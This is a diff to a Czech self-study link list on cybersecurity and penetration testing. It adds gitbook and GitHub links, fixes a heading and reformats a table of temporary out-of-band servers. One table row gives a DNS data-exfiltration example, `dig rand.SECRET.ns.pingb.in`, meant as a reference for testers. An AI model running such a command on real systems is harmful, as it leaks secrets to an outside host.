@@ -1,6 +1,10 @@
 # Rozcestník pro samostudium kybernetické bezpečnosti
 
 Užitečné odkazy pro oblast kybernetické bezpečnosti, zejména penetračního testování.
+Jako gitbook dostupné na [chovanecadam.gitbook.io/cybersecurity/](https://chovanecadam.gitbook.io/cybersecurity/),
+gitový repozitář na [github.com/chovanecadam/cybersecurity](https://github.com/chovanecadam/cybersecurity).
+
+Kromě odkazů sem budu přidávat i vlastní poznámky, ale to nejspíš spíše sporadicky[.](https://youtu.be/dQw4w9WgXcQ)
 
 ## Interaktivní tutoriály a kurzy
 
@@ -26,7 +30,7 @@ Užitečné odkazy pro oblast kybernetické bezpečnosti, zejména penetračníh
 * [HackSplaining](https://www.hacksplaining.com/)
 * [Metasploit Unleashed](https://www.offensive-security.com/metasploit-unleashed/)
 
-## Videa, konference, youtube
+## Videa, konference, YouTube
 
 * [IppSec](https://www.youtube.com/channel/UCa6eh7gCkpPo5XXUDfygQQA)
 * [VbScrub](https://www.youtube.com/channel/UCpoyhjwNIWZmsiKNKpsMAQQ)
@@ -78,9 +82,9 @@ Užitečné odkazy pro oblast kybernetické bezpečnosti, zejména penetračníh
 
 ## Temporary domény, url, emaily, OOB servery
 
-| název                                     | popis                                                             |
-| ----------------------------------------- | ----------------------------------------------------------------- |
-| * [webhook.site](https://webhook.site/)   | asi nejlepší možnost, až 500 requestů                             |
-| * [pingb.in](http://pingb.in)             | data exiltration pomocí DNS lookup: `dig rand.SECRET.ns.pingb.in` |
-| * [RequestBin.net](http://requestbin.net) | veřejné URL, ukazuje HTTP hlavičky, POST parametry, GET parametry |
+| název                                   | popis                                                             |
+| --------------------------------------- | ----------------------------------------------------------------- |
+| [webhook.site](https://webhook.site/)   | asi nejlepší možnost, až 500 requestů                             |
+| [pingb.in](http://pingb.in)             | data exiltration pomocí DNS lookup: `dig rand.SECRET.ns.pingb.in` |
+| [RequestBin.net](http://requestbin.net) | veřejné URL, ukazuje HTTP hlavičky, POST parametry, GET parametry |
 
